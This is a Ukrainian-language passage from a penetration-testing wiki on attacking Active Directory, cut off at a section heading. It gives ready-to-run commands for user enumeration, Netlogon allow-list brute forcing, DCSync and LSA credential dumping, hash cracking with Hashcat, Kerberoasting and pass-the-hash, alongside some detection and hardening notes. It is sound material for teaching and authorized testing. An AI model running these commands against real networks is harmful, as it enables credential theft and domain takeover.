# Методологія Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Основний огляд

**Active Directory** — це фундаментальна технологія, яка дає змогу **мережевим адміністраторам** ефективно створювати й керувати **доменами**, **користувачами** та **об’єктами** в мережі. Вона розроблена з урахуванням масштабування: дає змогу впорядковувати велику кількість користувачів у керовані **групи** й **підгрупи**, контролюючи **права доступу** на різних рівнях.

Структура **Active Directory** складається з трьох основних рівнів: **доменів**, **дерев** і **лісів**. **Домен** охоплює набір об’єктів, як-от **користувачі** чи **пристрої**, що використовують спільну базу даних. **Дерева** — це групи доменів, об’єднаних спільною структурою, а **ліс** — це набір кількох дерев, з’єднаних **довірчими відносинами**, який утворює найвищий рівень організаційної структури. На кожному з цих рівнів можна призначати певні **права доступу** та **права на обмін даними**.

Основні поняття **Active Directory**:

1. **Каталог** — зберігає всю інформацію про об’єкти Active Directory.
2. **Об’єкт** — позначає сутності в каталозі, зокрема **користувачів**, **групи** чи **спільні папки**.
3. **Домен** — контейнер для об’єктів каталогу; у межах **лісу** можуть співіснувати кілька доменів, кожен зі своїм набором об’єктів.
4. **Дерево** — група доменів зі спільним кореневим доменом.
5. **Ліс** — найвищий рівень організаційної структури в Active Directory, що складається з кількох дерев, пов’язаних **довірчими відносинами**.

**Active Directory Domain Services (AD DS)** охоплює низку служб, критично важливих для централізованого керування мережею та обміну даними в ній. До них належать:

1. **Domain Services** — централізує зберігання даних і керує взаємодією між **користувачами** та **доменами**, зокрема забезпечує **автентифікацію** та **пошук**.
2. **Certificate Services** — керує створенням, розповсюдженням і обслуговуванням захищених **цифрових сертифікатів**.
3. **Lightweight Directory Services** — підтримує програми з підтримкою каталогів через **протокол LDAP**.
4. **Directory Federation Services** — забезпечує **єдиний вхід (single sign-on)** для автентифікації користувачів у кількох вебпрограмах протягом одного сеансу.
5. **Rights Management** — допомагає захищати матеріали, захищені авторським правом, обмежуючи їхнє несанкціоноване розповсюдження та використання.
6. **DNS Service** — критично важлива для розпізнавання **доменних імен**.

Докладніше дивіться: [**TechTerms - визначення Active Directory**](https://techterms.com/definition/active_directory)

### Перерахування користувачів

- **Анонімне перерахування SMB/LDAP:** дивіться сторінки [**Pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) та [**Pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Перерахування Kerbrute**: коли запитується **неправильне ім’я користувача**, сервер відповість кодом помилки **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, що дає змогу визначити, що ім’я користувача неправильне. Для **правильних імен користувачів** буде повернуто або **TGT у відповіді AS-REP**, або помилку _KRB5KDC_ERR_PREAUTH_REQUIRED_, яка вказує, що користувач має пройти попередню автентифікацію.
- **Автентифікація до MS-NRPC не потрібна**: використання auth-level = 1 (без автентифікації) для інтерфейсу MS-NRPC (Netlogon) на контролерах домену. Після прив’язки інтерфейсу MS-NRPC метод викликає функцію `DsrGetDcNameEx2`, щоб перевірити, чи існує користувач або комп’ютер, не використовуючи облікових даних. Інструмент [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) реалізує цей тип перерахування. Дослідження доступне [тут](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

Якщо ви виявили один із таких серверів у мережі, можна також виконати **перерахування користувачів на ньому**. Наприклад, можна скористатися інструментом [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

### Зловживання списком дозволених облікових записів для вразливого каналу Netlogon (Onelogon)

Навіть після встановлення виправлення для **Zerologon** на DC явно внесені до списку дозволених облікові записи все ще можуть бути вразливими до **застарілої/вразливої поведінки захищеного каналу Netlogon**. Ризикована конфігурація — це GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** або відповідне значення реєстру **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Це значення — дескриптор безпеки **SDDL** (див. [Security Descriptors](security-descriptors.md)). Будь-який обліковий запис або групу, якій надано відповідний ACE у DACL, можна атакувати. Наприклад, `O:BAG:BAD:(A;;RC;;;WD)` фактично додає до списку дозволених **Everyone**.

Практичний порядок дій оператора:

1. **Визначте внесених до списку дозволених суб’єктів безпеки**, перевіривши і **SYSVOL/GPO**, і **реєстр активного DC**.
2. **Визначте відповідні SID** з SDDL, щоб знайти реальних користувачів/комп’ютери AD, і надайте пріоритет **обліковим записам комп’ютерів DC**, **обліковим записам довіри** та іншим привілейованим машинам.
3. Повторно намагайтеся пройти **автентифікацію MS-NRPC / Netlogon** від імені облікового запису зі списку дозволених.
4. Після успішного підбору скористайтеся **встановленням пароля через Netlogon**, щоб скинути пароль цільового облікового запису (у публічному PoC він задається як порожній рядок).<sup>[[9]](#references)[[10]](#references)</sup>

Приклади швидкої перевірки / лабораторних тестів із публічного артефакту:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Нотатки:

- **Сканер** корисний, оскільки ефективний список дозволених може зберігатися в **SYSVOL**, у **реєстрі** або в обох місцях.
- Сам шлях експлуатації важливий, оскільки після виявлення вразливого облікового запису він **не потребує привілеїв Domain Admin**.
- Компрометація **облікового запису комп’ютера контролера домену**, наприклад `DC$`, особливо небезпечна, оскільки скидання його пароля може безпосередньо відкрити ширші шляхи до **захоплення AD**.
- **Можливість brute-force** залежить від режиму: у загальнодоступному артефакті описано підхід meet-in-the-middle, **24-бітний** brute-force за наявності облікового запису іншого комп’ютера та повільніші **32-бітні** варіанти.

Нотатки щодо виявлення / посилення захисту:

- Перевірте політику списку дозволених і видаліть усе, крім тимчасових, явно необхідних винятків для сумісності.
- Відстежуйте події **5827/5828/5829/5830/5831** у журналі **System** контролерів домену, щоб виявляти випадки, коли вразливі з’єднання Netlogon відхиляються, виявляються або явно дозволяються політикою.
- Вважайте облікові записи у `VulnerableChannelAllowList` **високоризиковими**, доки не буде усунуто залежність від застарілих систем.

### NTLM Relay

Перерахування Active Directory надає імена користувачів, адреси електронної пошти та шаблони іменування, потенційні хости й служби, які можна змусити автентифікуватися. Використовуйте ці дані, щоб визначити придатні для застосування NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) і потенційні шляхи проникнення в середовище AD.

### Перевірка середовища та стану relay за допомогою робочих просторів NetExec

- Використовуйте **робочі простори `nxcdb`**, щоб зберігати дані розвідки AD окремо для кожного завдання: `workspace create <name>` створює окремі бази даних SQLite для кожного протоколу в `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap тощо). Перемикайте подання за допомогою `proto smb|mssql|winrm`, а зібрані секрети переглядайте командою `creds`. Після завершення вручну видаліть конфіденційні дані: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Швидке виявлення підмережі за допомогою **`netexec smb <cidr>`** показує **домен**, **збірку ОС**, **вимоги до підписування SMB** та **Null Auth**. Вузли, позначені `(signing:False)`, **вразливі до relay**, тоді як для контролерів домену часто потрібне підписування.
- Створюйте **імена хостів у /etc/hosts** безпосередньо з виводу NetExec, щоб спростити вибір цілей:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Коли **SMB relay до DC заблоковано** через підписування, усе одно перевіряйте стан **LDAP**: `netexec ldap <dc>` виявляє `(signing:None)` / слабке прив’язування каналу. DC з обов’язковим SMB signing, але вимкненим LDAP signing, залишається придатною ціллю для **relay-to-LDAP** зловживань, як-от **SPN-less RBCD**.

### Credential leaks через клієнтські принтери → масова перевірка доменних облікових даних

- Вебінтерфейси принтерів іноді **вбудовують замасковані паролі адміністратора в HTML**. Перегляд вихідного коду/devtools може виявити пароль у відкритому вигляді (наприклад, `<input value="<password>">`), що дає змогу отримати доступ через Basic-auth до сховищ сканованих документів і завдань друку.
- Отримані завдання друку можуть містити **документи для первинного налаштування з паролями користувачів у відкритому вигляді**. Під час перевірки зберігайте відповідність паролів користувачам:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Hash Shucking і NT-Candidate-атаки

**Hash shucking** використовує кожен NT-хеш, який у вас уже є, як пароль-кандидат для інших, повільніших форматів, ключовий матеріал яких безпосередньо отримується з NT-хешу. Замість brute-force довгих парольних фраз у квитках Kerberos RC4, викликах NetNTLM або кешованих облікових даних ви передаєте NT-хеші в NT-candidate-режими Hashcat, щоб перевірити повторне використання паролів, не дізнаючись їх у відкритому вигляді. Цей метод особливо ефективний після компрометації домену, коли можна зібрати тисячі поточних і попередніх NT-хешів.<sup>[[5]](#references)</sup>

Використовуйте shucking, якщо:

- У вас є набір NT-хешів із DCSync, дампів SAM/SECURITY або сховищ облікових даних і потрібно перевірити повторне використання в інших доменах/лісах.
- Ви перехопили матеріал Kerberos на основі RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), відповіді NetNTLM або блоби DCC/DCC2.
- Ви хочете швидко довести повторне використання довгих парольних фраз, які неможливо зламати, і одразу перейти до Pass-the-Hash.

Ця техніка **не працює** з типами шифрування, ключі яких не є NT-хешем (наприклад, Kerberos etype 17/18 AES). Якщо в домені дозволено лише AES, потрібно повернутися до звичайних режимів роботи з паролями.

#### Формування набору NT-хешів

- **DCSync/NTDS** – Використовуйте `secretsdump.py` з історією, щоб отримати якомога більше NT-хешів (і їхні попередні значення):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Записи в історії значно розширюють пул кандидатів, оскільки Microsoft може зберігати до 24 попередніх хешів для кожного облікового запису. Інші способи отримати секрети NTDS дивіться тут:

{{#ref}}
dcsync.md
{{#endref}}

- **Дампи кешу кінцевих точок** — `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (або Mimikatz `lsadump::sam /patch`) витягує дані локальних SAM/SECURITY і кешовані доменні облікові дані (DCC/DCC2). Видаліть дублікати та додайте ці хеші до того самого списку `nt_candidates.txt`.
- **Відстежуйте метадані** — зберігайте ім’я користувача/домен, для якого отримано кожен хеш (навіть якщо список слів містить лише hex). Коли Hashcat виведе відповідний кандидат, збіг хешів одразу покаже, який принципал повторно використовує пароль.
- Віддавайте перевагу кандидатам із того самого лісу або довіреного лісу: це максимізує ймовірність збігу під час shucking.

#### Режими NT-кандидатів у Hashcat

| Тип хешу                                | Режим пароля | Режим NT-кандидатів |
| ---------------------------------------- | ------------- | ----------------- |
| Кешовані доменні облікові дані (DCC)          | 1100          | 31500             |
| Кешовані доменні облікові дані 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Примітки:

- Вхідні дані NT-кандидатів **мають залишатися сирими NT-хешами у 32-значному hex-форматі**. Вимкніть механізми правил (без `-r` і гібридних режимів), оскільки модифікація спотворить матеріал ключа-кандидата.
- Ці режими не є швидшими самі по собі, але простір ключів NTLM (~30 000 MH/s на M3 Max) приблизно у 100 разів швидший за Kerberos RC4 (~300 MH/s). Перевірити підібраний список NT набагато дешевше, ніж перебирати весь простір паролів у повільному форматі.
- Завжди використовуйте **найновішу збірку Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), оскільки режими 31500/31600/35300/35400 з’явилися нещодавно.<sup>[[7]](#references)</sup>
- Наразі режиму NT для AS-REQ Pre-Auth немає, а для AES etypes (19600/19700) потрібен пароль у відкритому вигляді, оскільки їхні ключі виводяться через PBKDF2 із паролів UTF-16LE, а не із сирих NT-хешів.

#### Приклад — Kerberoast RC4 (режим 35300)

1. Отримайте RC4 TGS для цільового SPN за допомогою користувача з низькими привілеями (подробиці див. на сторінці Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Витягніть ticket за допомогою вашого списку NT:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat виводить ключ RC4 із кожного NT-кандидата й перевіряє blob `$krb5tgs$23$...`. Збіг підтверджує, що обліковий запис служби використовує один із ваших наявних NT-хешів.

3. Негайно перейдіть до PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   За потреби пізніше можна відновити відкритий текст за допомогою `hashcat -m 1000 <matched_hash> wordlists/`.

#### Приклад – кешовані облікові дані (режим 31600)

1. Вивантажте кешовані облікові записи з скомпрометованої робочої станції:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Скопіюйте рядок DCC2 для цікавого користувача домену у `dcc2_highpriv.txt` і зламайте його:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Успішний збіг дає вже відомий у вашому списку NT hash, доводячи, що кешований користувач повторно використовує пароль. Використайте його безпосередньо для PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) або підберіть пароль у швидкому режимі NTLM, щоб відновити його у відкритому вигляді.

Той самий процес застосовується до challenge-response NetNTLM (`-m 27000/27100`) і DCC (`-m 31500`). Щойно знайдете збіг, можна запускати relay, PtH через SMB/WMI/WinRM або повторно зламати NT hash офлайн за допомогою масок/правил.



## Перерахування Active Directory ЗА наявності облікових даних/сеансу

Перш ніж починати автентифіковане перерахування, розберіться з **проблемою подвійного переходу Kerberos**.

### Перерахування

Компрометація облікового запису — **важливий крок в оцінюванні домену**, оскільки вона дає змогу виконувати автентифіковане **перерахування Active Directory**:

Щодо [**ASREPRoast**](asreproast.md), тепер можна знайти всіх потенційно вразливих користувачів; щодо [**Password Spraying**](password-spraying.md), можна отримати **список усіх імен користувачів** і спробувати пароль скомпрометованого облікового запису, порожні паролі та нові перспективні паролі.

- Можна використати [**CMD для базової розвідки**](../basic-cmd-for-pentesters.md#domain-info)
- Для розвідки також можна скористатися [**powershell**](../basic-powershell-for-pentesters/index.html): цей спосіб буде менш помітним
- Також можна [**використати powerview**](../basic-powershell-for-pentesters/powerview.md), щоб отримати детальнішу інформацію
- Ще один чудовий інструмент для розвідки в Active Directory — [**BloodHound**](bloodhound.md). Він **не дуже непомітний** (залежно від використаних методів збору даних), але **якщо вас це не турбує**, неодмінно спробуйте його. Дізнайтеся, де користувачі можуть підключатися через RDP, знайдіть шлях до інших груп тощо.
  - **Інші автоматизовані інструменти перерахування AD:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- Перевірте [**DNS-записи AD**](ad-dns-records.md): вони можуть містити цікаву інформацію.
- Для перерахування каталогу можна скористатися **графічним інструментом** **AdExplorer.exe** із набору **SysInternal** Suite.
- Також можна шукати в базі даних LDAP за допомогою **ldapsearch**, щоб знайти облікові дані в полях _userPassword_ і _unixUserPassword_, а також у примітках _description_ та _info_ користувача. Токен у полі _info_, який не має підпису, але схожий на пароль, є лише кандидатом: окремо перевірте його призначення та дійсність, а вивід звичайного перерахування не повинен містити вміст приміток. Інші методи наведено в матеріалі [Password in AD User comment на PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment).
- Якщо це дозволяє авторизація, перегляньте **доступні** скрипти входу в домен і скрипти зіставлення дисків у `\\<dc>\NETLOGON` або `\\<dc>\SYSVOL\<domain>\scripts`. У [документації Microsoft](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) описано призначення каталогу скриптів у спільному ресурсі NETLOGON. Спочатку перегляньте назви, а потім перевірте лише релевантні доступні для читання скрипти, обмеживши їхній розмір; не вивантажуйте весь спільний ресурс і не виводьте значення облікових даних під час звичайного перерахування. Виклик PowerShell [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **не захищає** пароль, записаний у скрипті звичайним текстом. Сам по собі цей виклик не доводить, що секрет жорстко закодований: простежте його фактичне джерело, а потім окремо перевірте обліковий запис, дійсність облікових даних і привілеї. Перегляд скриптів у спільному доменному ресурсі — це окрема перевірка від перерахування локального хоста.
- Якщо ви використовуєте **Linux**, можна також перерахувати домен за допомогою [**pywerview**](https://github.com/the-useless-one/pywerview).
- Можна також спробувати такі автоматизовані інструменти:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Отримання всіх користувачів домену**

  У Windows дуже легко отримати всі імена користувачів домену (`net user /domain` ,`Get-DomainUser` або `wmic useraccount get name,sid`). У Linux можна скористатися: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` або `enum4linux -a -u "user" -p "password" <DC IP>`

> Хоча цей розділ про перерахування може здаватися коротким, це найважливіша частина всього процесу. Перейдіть за посиланнями (передусім на cmd, powershell, powerview і BloodHound), навчіться перераховувати домен і практикуйтеся, доки не почуватиметеся впевнено. Під час оцінювання це буде ключовий етап, щоб знайти шлях до DA або визначити, що зробити нічого не можна.

### Передбачувані попередньо створені облікові записи комп’ютерів -> доступ до пароля gMSA

Облікові записи комп’ютерів, підготовлені для приєднання застарілих систем до домену, можуть зберігати передбачуваний початковий пароль. Модуль NetExec `pre2k` визначає характерне значення `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) і намагається отримати Kerberos TGT, використовуючи перші 14 символів імені комп’ютера в нижньому регістрі без кінцевого `$`. Розглядайте це значення UAC як критерій відбору кандидатів, а не припускайте, що членство лише в **Pre-Windows 2000 Compatible Access** доводить слабкість пароля.<sup>[[18]](#references)[[20]](#references)</sup>

Використовуйте автентифіковане перерахування LDAP, щоб перевірити кандидатів і зберегти успішно отримані TGT. `ALL=True` розширює перевірку на об’єкти, що не відповідають стандартному фільтру `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Невдалий bind за замовчуванням/NTLM **не** спростовує цю знахідку: перевірте за допомогою `-k`, FQDN, що вказує на DC, і годинника, синхронізованого з KDC. У разі успішного запуску модуля списки кандидатів і отримані ccaches зберігаються в `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Після компрометації облікового запису комп'ютера дослідіть його вкладені членства у групах і права вихідного доступу. Зокрема, суб'єкти, зазначені в дескрипторі безпеки `msDS-GroupMSAMembership` облікового запису gMSA, можуть читати `msDS-ManagedPassword`; вивід NetExec з параметром `--gmsa` показує суб'єктів із дозволом і повертає поточний NT hash, якщо автентифікований комп'ютер має відповідні права.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Потім оцініть отриманий gMSA, як будь-які інші облікові дані: перевірте членство в локальних/доменних групах, права входу, SPN, делегування та доступні служби, перш ніж пробувати pass-the-hash. Цей шлях отримання на основі ACL відрізняється від [Golden gMSA/dMSA](golden-dmsa-gmsa.md), який дає змогу вивести паролі керованих облікових записів після компрометації кореневого ключа KDS.<sup>[[20]](#references)</sup>

Обліковий запис комп’ютера також може мати вихідний контроль над іншими об’єктами комп’ютерів або групами. Отримавши такий обліковий запис, окремо перевірте його вкладене членство та ефективні ACL: право на запис до іншого об’єкта комп’ютера може дозволити змінити обліковий запис, а права членства в групі можуть надати роль для входу. Прапорець staged-account, передбачуване правило іменування або ребро `GenericWrite` самі по собі не доводять наявність повного шляху.

Окремий шлях витоку — доступна для читання копія блоба `msDS-ManagedPassword` у файлі, спільному ресурсі або резервній копії: ACL на читання LDAP не захищає копію, збережену в іншому місці. Переконайтеся, що це дані блоба пароля керованого облікового запису, перш ніж їх інтерпретувати, і відрізняйте цей випадок як від дозволеного читання LDAP, так і від виведення пароля за кореневим ключем KDS.

### Локальне підвищення привілеїв

Якщо ви скомпрометували облікові дані або отримали сеанс звичайного користувача домену й можете отримати доступ до **будь-якої машини в домені**, шукайте шлях, щоб **локально підвищити привілеї та зібрати облікові дані**. Привілеї локального адміністратора можуть дозволити вам **скинути хеші інших користувачів** із пам’яті (LSASS) і локального сховища (SAM).

### Pass the Hash

**Отримавши хеш користувача**, ви можете використати його, щоб **видати себе за цього користувача**.\
Потрібно скористатися **інструментом**, який **виконає автентифікацію NTLM за допомогою** цього **хешу**, **або** створити новий **сеанс входу** й **впровадити** цей **хеш** у **LSASS**, щоб він використовувався під час будь-якої **автентифікації NTLM**. Саме останній спосіб використовує mimikatz.\
[**Докладніше читайте на цій сторінці.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Мета цієї атаки — **використати NTLM-хеш користувача для запиту квитків Kerberos** як альтернативу поширеному Pass The Hash через протокол NTLM. Тому вона може бути особливо **корисною в мережах, де протокол NTLM вимкнено**, а як протокол автентифікації дозволено лише **Kerberos**.

### Група AdminSDHolder

Об’єкт **AdminSDHolder** в Active Directory забезпечує безпеку **привілейованих груп** (наприклад, Domain Admins і Enterprise Admins), застосовуючи до них стандартний **список керування доступом (ACL)**, щоб запобігти несанкціонованим змінам. Однак цю функцію можна використати у зловмисних цілях: якщо зловмисник змінить ACL AdminSDHolder, надавши звичайному користувачеві повний доступ, цей користувач отримає широкі права керування всіма привілейованими групами. Таким чином, цей механізм безпеки може мати зворотний ефект і надати небажаний доступ, якщо його ретельно не контролювати.

## Підвищення привілеїв у лісі — довіри доменів

Microsoft вважає **ліс** межею безпеки. Це означає, що **компрометація одного домену потенційно може призвести до компрометації всього лісу**.<sup>[[1]](#references)</sup>

### Основна інформація

[**Довіра доменів**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) — це механізм безпеки, який дає змогу користувачеві з одного **домену** отримувати доступ до ресурсів іншого **домену**. По суті, вона пов’язує системи автентифікації двох доменів, даючи змогу безперешкодно передавати запити на перевірку автентифікації. Коли домени встановлюють довіру, вони обмінюються певними **ключами** та зберігають їх на своїх **контролерах домену (DC)**. Ці ключі критично важливі для цілісності довіри.

У типовому сценарії, якщо користувач хоче отримати доступ до служби в **довіреному домені**, йому спочатку потрібно запросити спеціальний квиток — **міждоменний TGT** — у DC власного домену. Цей TGT шифрується спільним **ключем**, узгодженим між двома доменами. Потім користувач передає цей TGT **контролеру домену довіреного домену**, щоб отримати квиток служби (**TGS**). Якщо DC довіреного домену успішно перевіряє міждоменний TGT, він видає TGS, надаючи користувачеві доступ до служби.

**Етапи**:

1. **Клієнтський комп’ютер** у **Домені 1** починає процес, використовуючи свій **NTLM-хеш**, щоб запросити **квиток Ticket Granting Ticket (TGT)** у свого **контролера домену (DC1)**.
2. Якщо клієнт успішно проходить автентифікацію, DC1 видає новий TGT.
3. Потім клієнт запитує у DC1 **міждоменний TGT**, потрібний для доступу до ресурсів у **Домені 2**.
4. Міждоменний TGT шифрується **ключем довіри**, спільним для DC1 і DC2 у межах двосторонньої довіри доменів.
5. Клієнт передає міждоменний TGT **контролеру домену Домену 2 (DC2)**.
6. DC2 перевіряє міждоменний TGT за допомогою спільного ключа довіри та, якщо він дійсний, видає **квиток Ticket Granting Service (TGS)** для сервера в Домені 2, до якого хоче отримати доступ клієнт.
7. Нарешті, клієнт передає цей TGS серверу. Квиток зашифрований хешем облікового запису сервера, і завдяки цьому клієнт отримує доступ до служби в Домені 2.

### Різні типи довіри

Важливо пам’ятати, що **довіра може бути односторонньою або двосторонньою**. За двосторонньої довіри домени довіряють один одному. За **односторонньої** довіри один домен є **довіреним**, а інший — **доменом, що довіряє**. У такому разі **отримати доступ до ресурсів домену, що довіряє, можна лише з довіреного домену**.

Якщо Домен A довіряє Домену B, то A — домен, що довіряє, а B — довірений домен. Крім того, для **Домену A** це буде **вихідна довіра**, а для **Домену B** — **вхідна довіра**.

**Різні типи довірчих зв’язків**

- **Довіра «батьківський домен — дочірній домен»**: поширена конфігурація в межах одного лісу, у якій дочірній домен автоматично має транзитивну двосторонню довіру з батьківським. Це означає, що запити на автентифікацію можуть безперешкодно передаватися між батьківським і дочірнім доменами.
- **Міждоменна довіра**: її також називають «довірою швидкого доступу». Вона встановлюється між дочірніми доменами, щоб пришвидшити процес перенаправлення. У складних лісах перенаправлення для автентифікації зазвичай проходять угору до кореня лісу, а потім униз до цільового домену. Міждоменні зв’язки скорочують цей шлях, що особливо корисно в географічно розподілених середовищах.
- **Зовнішня довіра**: встановлюється між різними, не пов’язаними між собою доменами й за своєю природою не є транзитивною. Згідно з [документацією Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), зовнішня довіра корисна для доступу до ресурсів домену за межами поточного лісу, який не з’єднаний довірою лісів. Безпеку підвищує фільтрація SID.
- **Довіра коренів дерев**: автоматично встановлюється між кореневим доменом лісу та новим коренем дерева. Хоча така довіра трапляється нечасто, вона важлива для додавання до лісу нових дерев доменів: кожне дерево зберігає унікальне ім’я домену, а довіра є транзитивною в обох напрямках. Докладніше дивіться в [посібнику Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Довіра лісів**: транзитивна двостороння довіра між кореневими доменами двох лісів, яка також застосовує фільтрацію SID для підвищення безпеки.
- **Довіра MIT**: встановлюється з доменами Kerberos, що не працюють на Windows і відповідають [RFC4120](https://tools.ietf.org/html/rfc4120). Довіра MIT має спеціалізоване призначення й підходить для середовищ, яким потрібна інтеграція із системами на основі Kerberos поза екосистемою Windows.

#### Інші відмінності між **довірчими зв’язками**

- Довірчий зв’язок також може бути **транзитивним** (A довіряє B, B довіряє C, отже A довіряє C) або **нетранзитивним**.
- Довірчий зв’язок може бути **двостороннім** (домени довіряють один одному) або **одностороннім** (один домен довіряє іншому).

### Шлях атаки

1. **Перелічіть** довірчі зв’язки.
2. Перевірте, чи має якийсь **суб’єкт безпеки** (користувач/група/комп’ютер) **доступ** до ресурсів **іншого домену** — можливо, через записи ACE або членство в групах іншого домену. Шукайте **зв’язки між доменами** (імовірно, саме для цього й було встановлено довіру).
   1. У цьому випадку ще одним варіантом може бути kerberoast.
3. **Скомпрометуйте** облікові **записи**, за допомогою яких можна **переміщатися** між доменами.

Зловмисники можуть отримувати доступ до ресурсів іншого домену трьома основними способами:

- **Членство в локальній групі**: суб’єкти можуть бути додані до локальних груп на комп’ютерах, наприклад до групи «Адміністратори» на сервері, що надає їм значний контроль над цим комп’ютером.
- **Членство в групі зовнішнього домену**: суб’єкти також можуть бути членами груп у зовнішньому домені. Однак ефективність цього способу залежить від типу довіри та області дії групи.
- **Списки керування доступом (ACL)**: суб’єкти можуть бути вказані в **ACL**, зокрема як учасники **ACE** у **DACL**, що надає їм доступ до певних ресурсів. Щоб докладніше розібратися в роботі ACL, DACL і ACE, дивіться технічний документ «[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)» — це надзвичайно цінне джерело.<sup>[[17]](#references)</sup>

#### Exploit доступного для запису Configuration NC

Важливо розуміти, як можна експлуатувати Configuration Naming Context (NC). Configuration NC є центральним сховищем даних конфігурації в лісах середовищ Active Directory (AD). Ці дані реплікуються на кожен контролер домену (DC) у лісі, а DC із можливістю запису зберігають доступну для запису копію Configuration NC. Для цієї експлуатації потрібні **привілеї SYSTEM на DC**, бажано на дочірньому DC.

**Зв’язування GPO із сайтом кореневого DC**

